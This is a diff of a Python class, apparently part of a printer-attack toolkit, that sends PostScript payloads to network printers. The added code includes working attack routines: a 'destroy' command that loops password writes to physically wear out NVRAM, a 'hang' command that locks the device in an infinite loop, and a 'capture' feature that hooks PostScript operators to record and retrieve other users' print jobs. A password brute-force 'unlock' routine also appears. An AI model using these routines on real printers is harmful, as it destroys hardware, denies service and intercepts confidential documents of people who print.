@@ -17,7 +17,8 @@ class postscript(printer):
     footer = '\n(' + token + '\\n) print flush\n' # additional line feed necessary
     # send command to printer device              # to get output on some printers
     try:
-      cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + c.EOL + footer
+      ### cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + c.EOL + footer
+      cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + footer
       # write to logfile
       log().write(self.logfile, str_send + os.linesep)
       # sent to printer
@@ -36,10 +37,15 @@ class postscript(printer):
   def ps_err(self, str_recv):
     self.error = None
     msg = item(re.findall(c.PS_ERROR, str_recv))
-    if msg:
-      output().errmsg("PostScript Error", msg)
+    if msg: # real postscript command errors
+      output().errmsg("PostScript Error", msg.strip())
       self.error = msg
       str_recv = ""
+    else: # printer errors or status messages
+      msg = item(re.findall(c.PS_CATCH, str_recv))
+      if msg:
+        self.chitchat("Status Message: '" + msg.strip() + "'")
+        str_recv = re.sub(r'' + c.PS_CATCH + '\r?\n', '', str_recv)
     return str_recv
 
   # disable printing hardcopies of error messages
@@ -139,7 +145,7 @@ class postscript(printer):
     return sorted(list)
 
   def find(self, path):
-    str_send = '/str 65535 string def (' + path + ') '\
+    str_send = '/str 256 string def (' + path + ') '\
                '{print (\\n) print} str filenameforall'
     return self.cmd(str_send, False)
 
@@ -209,11 +215,13 @@ class postscript(printer):
 
   # ------------------------[ put <local file> ]------------------------
   def put(self, path, data, mode='w+'):
-      # convert to PostScript-compatibe octal notation
-      data = ''.join(['\\{:03o}'.format(ord(char)) for char in data])
-      self.cmd('/outfile (' + path + ') (' + mode + ') file def\n'
-              + 'outfile (' + data + ') writestring\n'
-              + 'outfile closefile\n', False)
+    if self.iohack: # brother devices without any writeable volumes
+      output().warning("Writing might cause this device to crash")
+    # convert to PostScript-compatibe octal notation
+    data = ''.join(['\\{:03o}'.format(ord(char)) for char in data])
+    self.cmd('/outfile (' + path + ') (' + mode + ') file def\n'
+           + 'outfile (' + data + ') writestring\n'
+           + 'outfile closefile\n', False)
 
   # ------------------------[ append <file> <string> ]------------------
   def append(self, path, data):
@@ -336,7 +344,7 @@ class postscript(printer):
 
   # ------------------------[ lock <passwd> ]---------------------------
   def do_lock(self, arg):
-    "Lock changing of system parameters."
+    "Set startjob and system parameters password."
     if not arg:
       arg = raw_input("Enter password: ")
     self.cmd('<< /Password () '
@@ -346,7 +354,7 @@ class postscript(printer):
 
   # ------------------------[ unlock <passwd> ]-------------------------
   def do_unlock(self, arg):
-    "Unlock changing of system parameters."
+    "Unset startjob and system parameters password."
     max = 2**20 # exhaustive key search max value
     if not arg: # ~140.000 tries/sec on lj4250, wtf?
       print("No password given, cracking.")
@@ -370,7 +378,7 @@ class postscript(printer):
     # finally unlock device with password
     self.cmd('<< /Password (' + arg + ') '
              '/SystemParamsPassword () ' # mostly harmless settings
-             '/StartJobPassword () '     # administration functions
+             '/StartJobPassword () '     # permanent changes in VM
              '>> setsystemparams', False)
 
   # ------------------------[ restart ]---------------------------------
@@ -415,6 +423,46 @@ class postscript(printer):
                 else "currentdict /showpage undef"
     output().chitchat(str_disable + " printing functionality")
     self.cmd(str_send)
+
+  # ------------------------[ destroy ]---------------------------------
+  def do_destroy(self, arg):
+    "Cause physical damage to printer's NVRAM."
+    output().warning("Warning: This command tries to cause physical damage to the")
+    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
+    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
+   #   for n in range(0, 100000):
+   #     self.cmd('<< /Password (' + str(n) + ')\n'
+   #              '   /SystemParamsPassword (' + str(n+1) + ')\n'
+   #              '   /StartJobPassword     (' + str(n+1) + ')\n'
+   #              '>> setsystemparams')
+      # unfortunatelly we cannot set passwords in a postscript loop
+      # itself as it seems the password is only set by the device when the postscript
+      # job is finished
+
+   # self.cmd('serverdict begin 0 exitserver\n'
+      for n in range(1, 100000):
+        self.cmd('/counter 0 def\n'
+                 '{ << /Password counter 16 string cvs\n'
+                 '     /SystemParamsPassword counter 1 add 16 string cvs\n'
+                 '     /StartJobPassword     counter 1 add 16 string cvs\n'
+                 '  >> setsystemparams\n'
+                 '  /counter counter 1 add def\n'
+                 '  counter ==\n'
+                 '  counter 1000 eq {exit} if\n'
+                 '} loop\n'
+                 '<< /Password counter 16 string cvs\n'
+                 '   /SystemParamsPassword (0)\n'
+                 '   /StartJobPassword     (0)\n'
+                 '>> setsystemparams')
+        self.chitchat("\rNVRAM write cycles: " + str(n*1000), '')
+
+  # ------------------------[ hang ]------------------------------------
+  def do_hang(self, arg):
+    "Execute PostScript invinite loop."
+    output().warning("Warning: This command causes an invinite loop rendering the")
+    output().warning("device useless until manual restart. Press CTRL+C to abort.")
+    if output().countdown("Executing PostScript invinite loop in...", 10, self):
+      self.cmd('{} loop', False)
 
   # ====================================================================
 
@@ -488,25 +536,142 @@ class postscript(printer):
       self.onecmd("help replace")
 
   # ------------------------[ capture ]---------------------------------
+  ######################################################################
+  #################### BACKUP OF WORKING VERSION TO ####################
+  #################### CAPTURE JOBS ON FILE SYSTEM. ####################
+  ######################################################################
+  # def do_capture(self, arg):
+  #   "Capture jobs to be printed on this device."
+  #   hook = 'currentfile' # must be first operator in documents to be printed
+  #   data = '  false echo % turn echo off as it slows down interpreters\n'\
+  #          '  /strcat {exch dup length 2 index length add string dup\n'\
+  #          '  dup 4 2 roll copy length 4 -1 roll putinterval} def\n'\
+  #          '  /rndname [(job_) rand 16 string cvs strcat (.ps) strcat] def\n'\
+  #          '  /capture {dup rndname 0 get (a+) file dup 3 2 roll writestring} def\n'\
+  #          '  /execute {cvx exec} def\n'\
+  #          '  {\n'\
+  #          '    currentdict (firstrun) known not\n'\
+  #          '    {(%!\\n' + hook + ' ) capture execute /firstrun 0 def} if\n'\
+  #          '    (%lineedit) (r) file dup\n'\
+  #          '    bytesavailable string readstring pop capture execute\n'\
+  #          '  } loop'
+  #   # hook our code into very first postscript operator
+  #   self.cmd('serverdict begin 0 exitserver\n'
+  #            '/' + hook + ' {\n'+ data + '\n} def')
+  #   self.chitchat("Future print jobs will be captured on file system.")
+
+  # ------------------------[ capture <operation> ]---------------------
+
+  # BUGS: 
+  # - ES KÖNNEN MOMENTAN MAX 60.000 ZEILEN JOBS GEPACTURED / RECEIVED WERDEN
+  # - AUCH GIBT ES SCHNELL EINEN VMERROR WENN ARRAYS ALS ZU GROSS DEFINIERT
+  # - lineedit vs. statementedit vs. stdin
+  # - jobs are not executed/printed :)
+  # - currentfile im moment darf nur einmal vorkommen, sonst erneut exitserver
+  # - der zufall ist noch schlecht
+
   def do_capture(self, arg):
-    "Capture jobs to be printed on this device."
-    hook = 'currentfile' # must be first operator in documents to be printed
-    data = '  false echo % turn echo off as it slows down interpreters\n'\
-           '  /strcat {exch dup length 2 index length add string dup\n'\
-           '  dup 4 2 roll copy length 4 -1 roll putinterval} def\n'\
-           '  /rndname [(job_) rand 16 string cvs strcat (.ps) strcat] def\n'\
-           '  /capture {dup rndname 0 get (a+) file dup 3 2 roll writestring} def\n'\
-           '  /execute {cvx exec} def\n'\
-           '  {\n'\
-           '    currentdict (firstrun) known not\n'\
-           '    {(%!\\n' + hook + ' ) capture execute /firstrun 0 def} if\n'\
-           '    (%lineedit) (r) file dup\n'\
-           '    bytesavailable string readstring pop capture execute\n'\
-           '  } loop'
-    # hook our code into very first postscript operator
-    self.cmd('serverdict begin 0 exitserver\n'
-             '/' + hook + ' {\n'+ data + '\n} def')
-    self.chitchat("Future print jobs will be captured on file system.")
+    "Capture further jobs to be printed on this device."
+    # hooks must be the first operators in documents to be printed
+    hook = ['currentfile', 'serverdict begin 0 exitserver'] # hook for exitserver
+    hack = ['filter', 'currentfile /ASCII85Decode filter'] # hook for capture loop
+    # record future print jobs
+    if arg.startswith('start'):
+      data = '  /strcat {exch dup length 2 index length add string dup\n'\
+             '  dup 4 2 roll copy length 4 -1 roll putinterval} def\n'\
+             '  /rndname (job_) rand 16 string cvs strcat (.ps) strcat def\n'\
+             '  %------------------------------------------------------------------\n'\
+             '  false echo                                % no interpreter slowdown\n'\
+             '  /newjob true def                          % make sure to set new job\n'\
+             '  currentdict /'+hook[0]+' undef            % reset hooked operator\n'\
+             '  /max 40000 def                            % maximum dict/array size\n'\
+             '  /slots max array def                      % (re-)define slots array\n'\
+             '  /counter 2 dict def                       % slot and line counter\n'\
+             '  counter (slot) 0 put                      % initialize slot counter\n'\
+             '  counter (line) 0 put                      % initialize line counter\n'\
+             '  (capturedict) where {pop}                 % print jobs are saved here\n'\
+             '  {/capturedict max dict def} ifelse\n'\
+             '  capturedict rndname slots put             % assign slots to jobname\n'\
+             '  /slotnum {counter (slot) get} def         % get current slot counter\n'\
+             '  /linenum {counter (line) get} def         % get current line counter\n'\
+             '  %------------------------------------------------------------------\n'\
+             '  /capture {\n'\
+             '    linenum 0 eq {                          % start of current slot\n'\
+             '      /lines max array def                  % (re-)define lines array\n'\
+             '      slots slotnum lines put               % assign lines to current slot\n'\
+             '    } if\n'\
+             '    dup lines exch linenum exch put         % add current line to lines\n'\
+             '    counter (line) linenum 1 add put        % increment linecounter\n'\
+             '    linenum max eq {                        % slotsize limit reached\n'\
+             '      counter (slot) linenum 1 add put      % increment slotcounter\n'\
+             '      counter (line) 0 put                  % reset line counter\n'\
+             '    } if\n'\
+             '  } def\n'\
+             '  % - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n'\
+             '  /eot {dup (\\004) anchorsearch {pop pop permanent}{pop} ifelse} def\n'\
+             '  /execline {cvx exec} def\n'\
+             '  %------------------------------------------------------------------\n'\
+             '  { newjob {(%!\\n'+hack[1]+' ) capture\n'\
+             '    pop /newjob false def} if (%lineedit) (r) file\n'\
+             '    dup bytesavailable string readstring pop capture eot pop\n'\
+             '  } loop' # 2x execline, 1x eot
+      # hook our code into postscript operators
+      self.cmd('serverdict begin 0 exitserver\n'
+               '/permanent {/'+ hook[0]+' {'+hook[1]+'} def} def\n'\
+               'permanent /'+hack[0]+' {\n'+data+'\n} def')
+      output().raw("Future print jobs will be captured in memory")
+    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # show captured print jobs
+    elif arg.startswith('list'):
+      # now = output().info(str(datetime.timedelta(seconds=int(str_recv) / 1000)))
+      # str_recv = self.cmd('realtime ==')
+      # output().info("job    date        size      username    jobname    ")
+      # output().info("────────────────────────────────────────────────────")
+      str_send = '(capturedict) where {(Captured jobs:\n) print capturedict {exch ==}\n'\
+                 'forall}{(No jobs captured) print} ifelse' # TBD: date or n days ago
+      output().raw(self.cmd(str_send))
+    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # load captured print jobs
+    elif arg.startswith('fetch'):
+      joblist = self.cmd('(capturedict) where {capturedict {exch ==} forall} if').splitlines()
+      for job in joblist:
+        target, job = self.basename(self.target), self.basename(job)
+        root = os.path.join('capture', target)
+        lpath = os.path.join(root, job)
+        self.makedirs(root)
+        # download captured job
+        output().raw("Receiving " + lpath)
+        data = self.cmd('/str 65535 string def capturedict /' + job + ' get '
+          '{dup null ne { {dup null ne {str cvs print} if} forall } if} forall')
+        # remove UEL, normalize newlines 
+        data = re.sub(r'(\s+' + c.UEL + '$)', '', data)
+        data = os.linesep.join(data.splitlines())
+        print(str(len(data)) + " bytes received.")
+        # write to local file
+        file().write(lpath, data)
+    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    # end capturing print jobs
+    elif arg.startswith('stop'):
+      output().raw("Stopping job capture, deleting recorded jobs")
+      # we could simply use the 'restart' command for this
+      self.cmd('serverdict begin 0 exitserver\n'
+               'currentdict /capturedict undef\n'
+               'currentdict /' + hook[0] + ' undef\n'
+               'currentdict /' + hack[0] + ' undef')
+    else:
+      self.help_capture()
+
+  def help_capture(self):
+    print("Print job operations:  jobs <operation>")
+    print("  capture start   - Record future print jobs.")
+    print("  capture stop    - End capturing print jobs.")
+    print("  capture list    - Show captured print jobs.")
+    print("  capture fetch   - Save captured print jobs.")
+  # print("  capture print   - reprint saved print jobs.")
+
+  options_capture = ('start', 'list', 'fetch', 'stop')
+  def complete_capture(self, text, line, begidx, endidx):
+    return [cat for cat in self.options_capture if cat.startswith(text)]
 
   # ------------------------[ hold ]------------------------------------
   def do_hold(self, arg):
@@ -609,13 +774,13 @@ class postscript(printer):
                           'dup xcheck {(x) print}{(-) print} ifelse\n'
                           '( ) print dup length 65500 string cvs print\n'
                           '( ) print maxlength  65500 string cvs print')
-      if str_recv:
+      if len(str_recv.split()) == 3:
         output().info("%-5s %-5s %-5s %s" % tuple(str_recv.split() + [dict]))
 
   # ------------------------[ dump <dict> ]-----------------------------
-  def do_dump(self, arg):
+  def do_dump(self, arg, resource=False):
     "Dump all values of a dictionary:  dump <dict>"
-    dump = self.dictdump(arg)
+    dump = self.dictdump(arg, resource)
     if dump: output().psdict(dump)
 
   def help_dump(self):
@@ -635,7 +800,8 @@ class postscript(printer):
   # define alias
   complete_browse = complete_dump
 
-  def dictdump(self, dict):
+  def dictdump(self, dict, resource):
+    superexec = False # TBD: experimental privilege escalation
     if not dict: # dump whole dictstack if optional dict parameter is empty
       dict = 'superdict'
       self.chitchat("No dictionary given - dumping everything (might take some time)")
@@ -712,10 +878,10 @@ class postscript(printer):
                '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
                '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
                'def\n'
-    str_send += '(' + dict + ') where {bo 1183615869 ' + dict + ' {exch q 128 a q c dump n}'\
-                ' forall bc}{(<nonexistent>) print} ifelse'
-    str_recv = self.cmd(str_send)
-    str_recv = self.clean_json(str_recv)
+    if not resource: str_send += '(' + dict + ') where {'
+    str_send += 'bo 1183615869 ' + dict + ' {exch q 128 a q c dump n} forall bc'
+    if not resource: str_send += '}{(<nonexistent>) print} ifelse'
+    str_recv = self.clean_json(self.cmd(str_send))
     if str_recv == '<nonexistent>':
       output().info("Dictionary not found")
     else: # convert ps dictionary to json
@@ -725,44 +891,38 @@ class postscript(printer):
   def clean_json(self, string):
     string = re.sub(",[ \t\r\n]+}", "}", string)
     string = re.sub(",[ \t\r\n]+\]", "]", string)
-    return string
+    return unicode(string, errors='ignore')
 
-  def do_statusdict(self, arg):
-    output().info(self.cmd('statusdict {exch == == (\\n) print } forall'))
+  # ------------------------[ resource <category> [dump] ]--------------
+  def do_resource(self, arg):
+    arg = re.split("\s+", arg, 1)
+    cat, dump = arg[0], len(arg) > 1
+    self.populate_resource()
+    if cat in self.options_resource:
+      str_send = '(*) {128 string cvs print (\\n) print}'\
+                 ' 128 string /' + cat + ' resourceforall'
+      items = self.cmd(str_send).splitlines()
+      for item in sorted(items):
+        output().info(item)
+        if dump: self.do_dump('/' + item + ' /' + cat + ' findresource', True)
+    else:
+      self.onecmd("help resource")
 
-  # ====================================================================
+  def help_resource(self):
+    self.populate_resource()
+    print("List or dump PostScript resource:  resource <category> [dump]")
+    print("Available resources on this device:")
+    for res in sorted(self.options_resource): print("• " + res)
 
-  '''
-  load | site /systemdict load pstack
-    key load 
-    value 
-    searches dict stack for key and returns value
+  options_resource = []
+  def complete_resource(self, text, line, begidx, endidx):
+    return [cat for cat in self.options_resource if cat.startswith(text)]
 
-  where | site /== where pstack
-    key where 
-    dict true OR false 
-    finds dict in which key is defined
-
-  get | site systemdict /== get pstack
-    dict key get 
-    any 
-    returns value in dict associated to key
-
-  known | site systemdict /== known pstack
-    dict key known 
-    bool 
-    tests whether key is in dict
-
-  length
-    dict length 
-    int 
-    returns number of key-value pairs in the dictionary
-
-  maxlength
-    dict maxlength 
-    int 
-    capactity of dict
-  '''
+  # retrieve available resources
+  def populate_resource(self):
+    if not self.options_resource:
+      str_send = '(*) {print (\\n) print} 128 string /Category resourceforall'
+      self.options_resource = self.cmd(str_send).splitlines()
 
   # ------------------------[ set <key=value> ]-------------------------
   def do_set(self, arg):
@@ -816,3 +976,38 @@ class postscript(printer):
 
   def complete_config(self, text, line, begidx, endidx):
     return [cat for cat in self.options_config if cat.startswith(text)]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  def do_exitserver(self, arg):
+    output().info(self.cmd('serverdict begin 0 exitserver\n'
+      '/foobar {true ==} def'))
+
+
+
+  def do_startjob(self, arg):
+    output().info(self.cmd('true 0 startjob\n'
+      '/foobar1 {true ==} def'))
+
+
